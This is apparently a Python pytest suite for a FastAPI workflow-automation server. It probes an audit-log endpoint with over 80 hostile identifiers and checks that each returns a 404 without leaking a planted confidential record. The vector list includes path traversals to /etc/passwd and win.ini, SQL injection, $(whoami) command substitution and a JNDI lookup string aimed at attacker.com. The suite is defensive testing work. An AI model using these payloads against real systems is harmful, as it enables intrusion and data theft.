"""
tests.test_m4_it4_empirical_challenger
Milestone 4 Iteration 4 Empirical Adversarial Challenger Suite:
Comprehensive verification of:
1. 80+ adversarial probe vectors against GET /api/execute/audit/{id}:
   - Encoded slashes (%2F, %252F, %2f)
   - Literal slashes (/, //, ///, a/b/c)
   - Backslashes (\\, %5C, %255C)
   - Directory traversals (../, ..%2F, ..%5c, %2e%2e%2f, ....//, etc.)
   - Windows drive letters (C:, C:/, C:\\, C%3A%2F, D:, D:/, D%3A%2F, etc.)
   - Wildcards (*, ?, [], {}, glob characters)
   - Reserved DOS/Windows device names (CON, PRN, AUX, NUL, COM1, etc.)
   - Null bytes (%00), control characters, and newlines
   - Unicode homoglyphs and overlong encodings
   - Buffer overflow / length boundaries (256, 257, 2048, 4096)
   - SQLi/Command injection patterns
   Asserts all return HTTP 404 Problem Details with 'copyright': 'Copyrights reserved to 90Studio'
   and zero leak of confidential records.
2. Active execution & on-disk fallback query symmetry for workflow_id and execution_id.

Copyrights reserved to 90Studio
"""

import json
from pathlib import Path
import sys
import time
from typing import Any, List, Tuple
import uuid

import pytest
from fastapi.testclient import TestClient

SRC_PATH = Path(__file__).resolve().parent.parent / "src"
if str(SRC_PATH) not in sys.path:
    sys.path.insert(0, str(SRC_PATH))

from kutomoto.server.app import BASE_DIR, app, execution_manager, get_driver  # noqa: E402


class MockChallengerDriver:
    """Mock Win32 Driver for empirical challenge suite."""

    def __init__(self) -> None:
        self.dpi_set = False
        self.cursor_pos = (500, 400)
        self.foreground_hwnd = 1001
        self.clicks: List[Tuple[int, int, str, int]] = []
        self.typed_text: List[str] = []
        self.pressed_keys: List[Tuple[str, int]] = []
        self.cleared_fields: List[str] = []
        self.scrolls: List[Tuple[int, int]] = []
        self.modifiers_released: bool = False
        self.held_keys: List[Any] = []
        self.released_keys: List[Any] = []
        self.mouse_buttons_down: List[str] = []
        self.mouse_buttons_up: List[str] = []
        self.mock_windows = [
            {
                "hwnd": 1001,
                "title": "Banking KYC Customer Onboarding - Microsoft Edge",
                "class_name": "Chrome_WidgetWin_1",
                "pid": 1420,
                "executable_name": "msedge.exe",
                "executable_path": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                "is_visible": True,
                "is_iconic": False,
                "rect": (0, 0, 1920, 1080),
                "client_rect": (0, 0, 1920, 1040),
            }
        ]

    def set_dpi_awareness(self) -> bool:
        self.dpi_set = True
        return True

    def get_screen_dimensions(self) -> Tuple[int, int]:
        return (1920, 1080)

    def get_cursor_pos(self) -> Tuple[int, int]:
        return self.cursor_pos

    def set_cursor_pos(self, x: int, y: int) -> None:
        self.cursor_pos = (x, y)

    def get_foreground_window(self) -> int:
        return self.foreground_hwnd

    def find_window(self, title_pattern: str, match_mode: str = "contains", process_name: str | None = None) -> int | None:
        for w in self.mock_windows:
            if title_pattern.lower() in w["title"].lower():
                return w["hwnd"]
        return None

    def focus_window(self, hwnd: int, timeout_ms: int = 1500) -> bool:
        self.foreground_hwnd = hwnd
        return True

    def get_window_bounds(self, hwnd: int) -> Tuple[int, int, int, int]:
        return (0, 0, 1920, 1080)

    def get_client_rect(self, hwnd: int) -> Tuple[int, int, int, int]:
        return (0, 0, 1920, 1040)

    def send_click(self, x: int, y: int, button: str = "left", click_count: int = 1) -> None:
        self.clicks.append((x, y, button, click_count))

    def send_mouse_move(self, x: int, y: int) -> None:
        self.cursor_pos = (x, y)

    def send_text(self, text: str, delay_between_keys_ms: int = 20, use_clipboard_threshold: int = 40) -> None:
        self.typed_text.append(text)

    def send_key_press(self, key_name: str, repeat_count: int = 1) -> None:
        self.pressed_keys.append((key_name, repeat_count))

    def send_hotkey(self, modifiers: List[str], key: str) -> None:
        self.pressed_keys.append(("+".join(modifiers) + "+" + key, 1))

    def clear_field(self, strategy: str = "select_all_backspace") -> None:
        self.cleared_fields.append(strategy)

    def send_scroll(self, delta_x: int, delta_y: int) -> None:
        self.scrolls.append((delta_x, delta_y))

    def release_all_modifiers(self) -> None:
        self.modifiers_released = True

    def is_key_pressed(self, vk_code_or_name: Any) -> bool:
        return False

    def send_key_down(self, vk_name: Any) -> None:
        self.held_keys.append(vk_name)

    def send_key_up(self, vk_name: Any) -> None:
        self.released_keys.append(vk_name)

    def send_mouse_down(self, button: str = "left") -> None:
        self.mouse_buttons_down.append(button)

    def send_mouse_up(self, button: str = "left") -> None:
        self.mouse_buttons_up.append(button)


@pytest.fixture
def mock_driver():
    return MockChallengerDriver()


@pytest.fixture
def client(mock_driver, monkeypatch):
    """TestClient fixture with mock driver and fast test execution."""
    app.dependency_overrides[get_driver] = lambda: mock_driver
    monkeypatch.setenv("KUTOMOTO_TEST_FAST", "1")
    with TestClient(app, raise_server_exceptions=False) as test_client:
        yield test_client
    app.dependency_overrides.clear()


@pytest.fixture
def sample_payload():
    wf_id = f"wf_challenger_{uuid.uuid4().hex[:8]}"
    return {
        "schema_version": "1.0.0",
        "id": wf_id,
        "name": "Empirical Challenge Flow",
        "author": "90Studio Challenger",
        "copyright": "Copyrights reserved to 90Studio",
        "source_mode": "manual_step_flow",
        "target_application": {
            "type": "web_browser",
            "window_title_pattern": "Banking KYC Customer Onboarding",
            "process_name": "msedge.exe",
            "match_mode": "contains",
        },
        "execution_settings": {
            "countdown_seconds": 0,
            "default_step_delay_ms": 10,
            "typing_speed_ms": 5,
            "stop_on_error": True,
            "error_recovery_policy": "abort",
            "max_step_retries": 1,
            "failsafe_corner_enabled": True,
            "abort_hotkey": "Escape",
        },
        "variables": [],
        "steps": [
            {
                "step_id": str(uuid.uuid4()),
                "sequence_index": 1,
                "label": "Focus Target",
                "action_type": "focus_window",
                "enabled": True,
                "pre_delay_ms": 1000,
                "post_delay_ms": 1000,
                "parameters": {
                    "window_title_pattern": "Banking KYC Customer Onboarding",
                    "match_mode": "contains",
                },
            },
            {
                "step_id": str(uuid.uuid4()),
                "sequence_index": 2,
                "label": "Send Key",
                "action_type": "key_press",
                "enabled": True,
                "pre_delay_ms": 1000,
                "post_delay_ms": 1000,
                "parameters": {
                    "key_name": "Tab",
                    "repeat_count": 1,
                },
            },
        ],
    }


# ==============================================================================
# 80+ ADVERSARIAL VECTORS
# ==============================================================================

ADVERSARIAL_VECTORS = [
    # 1. Encoded Slashes (%2F, %2f, double encoding)
    "%2F",
    "%2f",
    "%252F",
    "%252f",
    "part1%2Fpart2",
    "part1%2fpart2",
    "%2Froot",
    "root%2F",
    "nested%2Fdeep%2Fpath",
    # 2. Literal Slashes
    "/",
    "//",
    "///",
    "////",
    "a/b",
    "a/b/c",
    "audit/nested",
    "/root",
    "trailing/",
    "/leading/and/trailing/",
    # 3. Backslashes (Literal & Encoded)
    "\\",
    "\\\\",
    "\\\\\\",
    "%5C",
    "%5c",
    "%255C",
    "%255c",
    "a\\b",
    "a%5Cb",
    "\\Windows\\System32",
    "\\\\127.0.0.1\\c$\\windows",
    "\\\\?\\C:\\secret",
    # 4. Path Traversals
    "..",
    "../",
    "..\\",
    "../../",
    "..\\..\\",
    "../../../etc/passwd",
    "..%2F",
    "..%2f",
    "..%2F..%2F",
    "..%2F..%2Fwin.ini",
    "..%2F..%2F..%2Fboot.ini",
    "%2e%2e%2f",
    "%2e%2e%5c",
    "%2e%2e/",
    "%2e%2e\\",
    ".../",
    "...\\",
    "....//",
    "....\\\\",
    "..%252f",
    "..%255c",
    "%252e%252e%252f",
    "%252e%252e%255c",
    "valid_wf/../../secret",
    # 5. Windows Drive Letters & Absolute Paths
    "C:",
    "C:/",
    "C:\\",
    "C%3A",
    "C%3A%2F",
    "C%3A%5C",
    "C%3A/",
    "C:/Windows/win.ini",
    "C:\\Windows\\win.ini",
    "D:",
    "D:/",
    "D:\\",
    "D%3A",
    "D%3A%2F",
    "D%3A%5C",
    "E:/",
    "E%3A%2F",
    "Z:/",
    "Z%3A%2F",
    "c:/",
    "c%3a%2f",
    # 6. Wildcards & Glob Metacharacters
    "*",
    "**",
    "*.*",
    "audit_*",
    "*_audit",
    "*_summary",
    "?",
    "???",
    "audit_?",
    "?_audit_?",
    "[",
    "]",
    "[]",
    "[a-z]",
    "[0-9]",
    "[!a-z]",
    "{",
    "}",
    "{}",
    "{a,b}",
    "audit_{1,2}",
    "*sensitive*",
    "*.json",
    "*.*.json",
    "../*",
    # 7. Reserved Windows / DOS Device Names
    "CON",
    "PRN",
    "AUX",
    "NUL",
    "COM1",
    "COM2",
    "COM9",
    "LPT1",
    "LPT2",
    "LPT9",
    "CON.txt",
    "NUL.json",
    "AUX.audit",
    # 8. Null Bytes & Control Characters
    "%00",
    "audit%00secret",
    "%0A",
    "%0D",
    "%09",
    "%1B",
    "%7F",
    # 9. Unicode Homoglyphs & Encodings
    "%EF%BC%8F",  # Fullwidth solidus
    "%EF%BC%8A",  # Fullwidth asterisk
    "%EF%BC%9F",  # Fullwidth question mark
    "%EF%BC%BC",  # Fullwidth reverse solidus
    "%E2%80%8B",  # Zero-width space
    "%C2%A0",      # Non-breaking space
    "%E2%80%AE",  # RTL override
    "%E2%80%8C",  # Zero-width non-joiner
    "%E2%80%8D",  # Zero-width joiner
    # 10. Special Characters & Injection Fragments
    " ",
    "%20",
    "~",
    "!",
    "@",
    "#",
    "$",
    "%",
    "^",
    "&",
    "(",
    ")",
    "=",
    "+",
    "|",
    ";",
    ":",
    "'",
    '"',
    "<",
    ">",
    "'; DROP TABLE audits;--",
    "' OR '1'='1",
    "$(whoami)",
    "`whoami`",
    "${jndi:ldap://attacker.com/x}",
    # 11. Length Overflow / DoS Boundaries
    "A" * 256,
    "A" * 257,
    "A" * 512,
    "A" * 1024,
    "A" * 2048,
    "A" * 4096,
    # 12. Non-existent identifiers
    "nonexistent_workflow_id_999999",
    "00000000-0000-0000-0000-000000000000",
]


class TestAdversarialSecurityProbes:
    """Empirical verification of 80+ adversarial probes against /api/execute/audit/{id}."""

    def test_total_adversarial_vectors_count_exceeds_80(self):
        """Verify vector test pool size."""
        assert len(ADVERSARIAL_VECTORS) >= 80, f"Expected 80+ vectors, found {len(ADVERSARIAL_VECTORS)}"

    def test_all_adversarial_vectors_return_404_problem_details(self, client):
        """
        Probe GET /api/execute/audit/{vector} for all 80+ adversarial vectors.
        Plant a confidential on-disk audit log to ensure no vectors trigger partial/wildcard leakage.
        """
        audit_dir = BASE_DIR / "data" / "audit"
        audit_dir.mkdir(parents=True, exist_ok=True)
        confidential_wf_id = "wf_challenger_topsecret_12345"
        confidential_exec_id = "exec_challenger_topsecret_67890"
        confidential_name = "Challenger Confidential Audit Record"
        confidential_file = audit_dir / f"audit_{confidential_wf_id}_{confidential_exec_id}_20261105T120000Z.json"
        confidential_file.write_text(
            json.dumps({
                "workflow_id": confidential_wf_id,
                "execution_id": confidential_exec_id,
                "workflow_name": confidential_name,
                "timestamp_utc": "2026-11-05T12:00:00Z",
                "copyright": "Copyrights reserved to 90Studio",
                "execution_summary": {
                    "total_steps": 5,
                    "successful_steps": 5,
                    "failed_steps": 0,
                    "retried_steps": 0,
                    "duration_seconds": 2.5,
                    "final_status": "SUCCESS",
                },
            }),
            encoding="utf-8",
        )

        try:
            # Clear caches to force evaluation through sanitization and disk lookups
            execution_manager._audit_summaries.clear()
            execution_manager._last_audit_summary = None

            failures = []
            for i, vec in enumerate(ADVERSARIAL_VECTORS):
                url = f"/api/execute/audit/{vec}"
                resp = client.get(url)
                status = resp.status_code

                # Verification:
                # 1. Must be HTTP 404
                if status != 404:
                    failures.append(f"Vector #{i+1} '{vec}' returned HTTP {status} instead of 404. Body: {resp.text[:100]}")
                    continue

                # 2. Must return RFC 7807 Problem Details with 90Studio copyright
                try:
                    data = resp.json()
                except Exception as ex:
                    failures.append(f"Vector #{i+1} '{vec}' response is not valid JSON: {ex}. Body: {resp.text[:100]}")
                    continue

                if data.get("copyright") != "Copyrights reserved to 90Studio":
                    failures.append(f"Vector #{i+1} '{vec}' missing 90Studio copyright. Found: {data.get('copyright')}")

                if data.get("status") != 404:
                    failures.append(f"Vector #{i+1} '{vec}' Problem Details status field is {data.get('status')} != 404")

                if "404" not in str(data.get("type", "")):
                    failures.append(f"Vector #{i+1} '{vec}' Problem Details type field does not reference 404: {data.get('type')}")

                # 3. Confidential data must NEVER leak
                if confidential_name in resp.text or confidential_wf_id in resp.text or confidential_exec_id in resp.text:
                    failures.append(f"Vector #{i+1} '{vec}' LEAKED confidential audit data in response!")

            assert not failures, f"Adversarial probe failures ({len(failures)}/{len(ADVERSARIAL_VECTORS)}):\n" + "\n".join(failures[:20])
        finally:
            if confidential_file.exists():
                confidential_file.unlink()


class TestIdentifierSymmetry:
    """Empirical verification of active execution and on-disk fallback query symmetry."""

    def test_active_running_execution_symmetry(self, client, sample_payload):
        """
        Verify that while a workflow is active (RUNNING), querying by workflow_id
        and execution_id yields symmetric responses with matching status and 90Studio copyright.
        """
        resp = client.post("/api/execute/start", json={"workflow": sample_payload})
        assert resp.status_code in (200, 202)
        exec_id = resp.json().get("execution_id")
        wf_id = sample_payload["id"]
        assert exec_id is not None

        try:
            # Wait for execution to enter RUNNING
            for _ in range(25):
                st = client.get("/api/execute/status").json()
                if st.get("state") == "RUNNING":
                    break
                time.sleep(0.02)

            res_wf = client.get(f"/api/execute/audit/{wf_id}")
            res_exec = client.get(f"/api/execute/audit/{exec_id}")

            assert res_wf.status_code == 200, f"Workflow ID query failed: {res_wf.status_code}: {res_wf.text}"
            assert res_exec.status_code == 200, f"Execution ID query failed: {res_exec.status_code}: {res_exec.text}"

            data_wf = res_wf.json()
            data_exec = res_exec.json()

            # Verify symmetry
            assert data_wf["workflow_id"] == wf_id
            assert data_exec["workflow_id"] == wf_id
            assert data_wf["execution_id"] == exec_id
            assert data_exec["execution_id"] == exec_id
            assert data_wf["status"] == data_exec["status"]
            assert data_wf["status"] in ("RUNNING", "IDLE", "PAUSED")
            assert data_wf["copyright"] == "Copyrights reserved to 90Studio"
            assert data_exec["copyright"] == "Copyrights reserved to 90Studio"
        finally:
            client.post("/api/execute/abort")

    def test_active_paused_execution_symmetry(self, client, sample_payload):
        """
        Verify that while a workflow is active (PAUSED), querying by workflow_id
        and execution_id yields symmetric responses with status 'PAUSED' and 90Studio copyright.
        """
        resp = client.post("/api/execute/start", json={"workflow": sample_payload})
        assert resp.status_code in (200, 202)
        exec_id = resp.json().get("execution_id")
        wf_id = sample_payload["id"]

        try:
            # Pause execution
            pause_resp = client.post("/api/execute/pause")
            assert pause_resp.status_code == 200

            res_wf = client.get(f"/api/execute/audit/{wf_id}")
            res_exec = client.get(f"/api/execute/audit/{exec_id}")

            assert res_wf.status_code == 200
            assert res_exec.status_code == 200

            data_wf = res_wf.json()
            data_exec = res_exec.json()

            assert data_wf["status"] == "PAUSED"
            assert data_exec["status"] == "PAUSED"
            assert data_wf["workflow_id"] == wf_id
            assert data_exec["workflow_id"] == wf_id
            assert data_wf["execution_id"] == exec_id
            assert data_exec["execution_id"] == exec_id
            assert data_wf["copyright"] == "Copyrights reserved to 90Studio"
            assert data_exec["copyright"] == "Copyrights reserved to 90Studio"
        finally:
            client.post("/api/execute/abort")

    def test_ondisk_fallback_single_execution_symmetry(self, client):
        """
        Verify on-disk fallback query symmetry when in-memory caches are purged.
        """
        audit_dir = BASE_DIR / "data" / "audit"
        audit_dir.mkdir(parents=True, exist_ok=True)
        wf_id = f"wf_disk_single_{uuid.uuid4().hex[:8]}"
        exec_id = f"exec_disk_single_{uuid.uuid4().hex[:8]}"
        wf_name = "Single On-Disk Verification"
        audit_file = audit_dir / f"audit_{wf_id}_{exec_id}_20261105T121000Z.json"

        record_data = {
            "workflow_id": wf_id,
            "execution_id": exec_id,
            "workflow_name": wf_name,
            "timestamp_utc": "2026-11-05T12:10:00Z",
            "copyright": "Copyrights reserved to 90Studio",
            "execution_summary": {
                "total_steps": 4,
                "successful_steps": 4,
                "failed_steps": 0,
                "retried_steps": 0,
                "duration_seconds": 1.85,
                "final_status": "SUCCESS",
            },
        }
        audit_file.write_text(json.dumps(record_data), encoding="utf-8")

        try:
            # Force cache eviction
            execution_manager._audit_summaries.clear()
            execution_manager._last_audit_summary = None

            res_wf = client.get(f"/api/execute/audit/{wf_id}")
            res_exec = client.get(f"/api/execute/audit/{exec_id}")

            assert res_wf.status_code == 200, f"WF query failed: {res_wf.text}"
            assert res_exec.status_code == 200, f"Exec query failed: {res_exec.text}"

            data_wf = res_wf.json()
            data_exec = res_exec.json()

            assert data_wf == data_exec, f"Payloads asymmetric: WF={data_wf} vs Exec={data_exec}"
            assert data_wf["workflow_id"] == wf_id
            assert data_wf["execution_id"] == exec_id
            assert data_wf["status"] == "SUCCESS"
            assert data_wf["total_steps"] == 4
            assert data_wf["successful_steps"] == 4
            assert data_wf["copyright"] == "Copyrights reserved to 90Studio"
        finally:
            if audit_file.exists():
                audit_file.unlink()

    def test_ondisk_fallback_multiple_executions_temporal_symmetry(self, client):
        """
        Verify on-disk fallback behavior when multiple execution records exist:
        - Query by workflow_id returns the latest execution.
        - Query by specific execution_id returns that exact execution (both older and newer).
        """
        audit_dir = BASE_DIR / "data" / "audit"
        audit_dir.mkdir(parents=True, exist_ok=True)
        wf_id = f"wf_disk_multi_{uuid.uuid4().hex[:8]}"
        exec_id_1 = f"exec_disk_first_{uuid.uuid4().hex[:8]}"
        exec_id_2 = f"exec_disk_second_{uuid.uuid4().hex[:8]}"

        file_1 = audit_dir / f"audit_{wf_id}_{exec_id_1}_20261105T100000Z.json"
        file_2 = audit_dir / f"audit_{wf_id}_{exec_id_2}_20261105T110000Z.json"

        file_1.write_text(
            json.dumps({
                "workflow_id": wf_id,
                "execution_id": exec_id_1,
                "workflow_name": "Multi Run 1",
                "timestamp_utc": "2026-11-05T10:00:00Z",
                "copyright": "Copyrights reserved to 90Studio",
                "execution_summary": {"total_steps": 2, "final_status": "FAILED", "successful_steps": 1, "failed_steps": 1, "retried_steps": 0, "duration_seconds": 1.0},
            }),
            encoding="utf-8",
        )

        file_2.write_text(
            json.dumps({
                "workflow_id": wf_id,
                "execution_id": exec_id_2,
                "workflow_name": "Multi Run 2",
                "timestamp_utc": "2026-11-05T11:00:00Z",
                "copyright": "Copyrights reserved to 90Studio",
                "execution_summary": {"total_steps": 2, "final_status": "SUCCESS", "successful_steps": 2, "failed_steps": 0, "retried_steps": 0, "duration_seconds": 0.8},
            }),
            encoding="utf-8",
        )

        try:
            # Force cache eviction
            execution_manager._audit_summaries.clear()
            execution_manager._last_audit_summary = None

            # 1. Query by workflow_id: should yield latest run (Run 2)
            res_wf = client.get(f"/api/execute/audit/{wf_id}")
            assert res_wf.status_code == 200
            data_wf = res_wf.json()
            assert data_wf["execution_id"] == exec_id_2
            assert data_wf["status"] == "SUCCESS"

            # 2. Query by exec_id_2: should match data_wf
            res_exec_2 = client.get(f"/api/execute/audit/{exec_id_2}")
            assert res_exec_2.status_code == 200
            assert res_exec_2.json() == data_wf

            # 3. Query by exec_id_1: should yield Run 1 specifically
            res_exec_1 = client.get(f"/api/execute/audit/{exec_id_1}")
            assert res_exec_1.status_code == 200
            data_exec_1 = res_exec_1.json()
            assert data_exec_1["execution_id"] == exec_id_1
            assert data_exec_1["status"] == "FAILED"
            assert data_exec_1["copyright"] == "Copyrights reserved to 90Studio"
        finally:
            if file_1.exists():
                file_1.unlink()
            if file_2.exists():
                file_2.unlink()

    def test_ondisk_fallback_negative_and_partial_identifier_matching(self, client):
        """
        Verify that partial prefixes, suffixes, substrings, or mismatched IDs
        return HTTP 404 Problem Details with 90Studio copyright and never leak on-disk records.
        """
        audit_dir = BASE_DIR / "data" / "audit"
        audit_dir.mkdir(parents=True, exist_ok=True)
        wf_id = f"wf_exact_boundary_{uuid.uuid4().hex[:8]}"
        exec_id = f"exec_exact_boundary_{uuid.uuid4().hex[:8]}"

        audit_file = audit_dir / f"audit_{wf_id}_{exec_id}_20261105T122000Z.json"
        audit_file.write_text(
            json.dumps({
                "workflow_id": wf_id,
                "execution_id": exec_id,
                "workflow_name": "Boundary Guard",
                "timestamp_utc": "2026-11-05T12:20:00Z",
                "copyright": "Copyrights reserved to 90Studio",
                "execution_summary": {"total_steps": 1, "final_status": "SUCCESS"},
            }),
            encoding="utf-8",
        )

        try:
            execution_manager._audit_summaries.clear()
            execution_manager._last_audit_summary = None

            negative_queries = [
                wf_id[: len(wf_id) - 4],      # prefix only
                wf_id[4:],                    # suffix only
                wf_id[3: len(wf_id) - 3],     # substring only
                exec_id[: len(exec_id) - 4],  # exec prefix
                f"{wf_id}_extra",             # superstring
                f"prefix_{exec_id}",          # superstring
                wf_id.upper() if not wf_id.isupper() else wf_id.lower(),  # case mismatch (if non-alphanumeric or case preserved)
            ]

            for q in negative_queries:
                resp = client.get(f"/api/execute/audit/{q}")
                assert resp.status_code == 404, f"Partial query '{q}' expected 404, got {resp.status_code}"
                data = resp.json()
                assert data.get("copyright") == "Copyrights reserved to 90Studio"
                assert data.get("status") == 404
        finally:
            if audit_file.exists():
                audit_file.unlink()
